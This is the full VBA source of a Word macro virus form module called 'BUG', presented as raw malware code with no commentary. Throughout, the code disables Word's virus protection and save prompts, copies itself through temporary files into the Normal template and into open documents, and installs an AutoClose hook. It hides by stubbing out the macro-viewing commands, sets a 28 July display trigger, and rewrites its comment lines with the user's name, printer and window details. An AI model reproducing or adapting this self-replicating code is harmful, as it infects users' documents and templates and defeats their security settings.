   VERSION 5.00
   Begin {C62A69F0-16DC-11CE-9E98-00AA00574A4F} BUG
      Caption         =   "                 * In Loving Memory *"
      ClientHeight    =   3885
      ClientLeft      =   45
      ClientTop       =   330
      ClientWidth     =   4020
      Enabled         =   0   'False
      OleObjectBlob   =   "Virus.MSWord.Bug-BUG.frx":0000
      StartUpPosition =   2  'CenterScreen
   End
   Attribute VB_Name = "BUG"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
   Sub UserForm_Click()
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
   On Error GoTo out
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
   Options.VirusProtection = False
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
   Options.SaveNormalPrompt = False
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
   Options.ConfirmConversions = False
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
   ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.countoflines
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
   nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.countoflines
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
   If nt > 0 And ad > 0 Then GoTo out
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
   If nt = 0 Then
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
       Set infect = NormalTemplate.VBProject.VBComponents
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
       Set host = ActiveDocument.VBProject.VBComponents
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
       host.Item(1).codemodule.replaceline 3, Application.UserInitials & ".UserForm_Click"
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
       host.Item(1).codemodule.replaceline 5, "If Day(Now) = 28 And Month(Now) = 7 Then " & Application.UserInitials & ".show"
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
       host.Item(1).Name = infect.Item(1).Name
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
       host.Item(2).Name = Application.UserInitials
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
       host.Item(1).Export "c:\one.sys"
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
       host.Item(2).Export "c:\two.sys"
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
   End If
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
   If ad = 0 Then Set infect = ActiveDocument.VBProject.VBComponents
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
   infect.Import ("c:\two.sys")
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
   infect.Item(1).codemodule.AddFromFile ("c:\one.sys")
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
   With infect.Item(1).codemodule
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
       For x = 1 To 4
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
       .deletelines 1
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
       Next x
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
       If nt = 0 Then
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
       .insertlines 9, vbCr & "Sub ViewVBCode()"
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
       .insertlines 11, vbCr & "End Sub"
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
       .insertlines 13, vbCr & "Sub ToolsMacro()"
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
       .insertlines 15, vbCr & "End Sub"
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
       End If
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
   End With
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
   If nt = 0 Then infect.Item(1).codemodule.replaceline 1, "Sub AutoClose()"
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
   If nt = 0 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
   With infect.Item(2).codemodule
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
       .deletelines 1
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
       For x = 1 To infect.Item(2).codemodule.countoflines Step 2
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
       .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
       Next x
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
   End With
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
   With infect.Item(1).codemodule
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
       For x = 2 To infect.Item(1).codemodule.countoflines Step 2
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
       .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
       Next x
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
   End With
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
   out:
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
   If nt <> 0 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
   End Sub
   'BOB8/10/98 12:02:18 PMHP LaserJet 4Si on LPT3:goat.doc
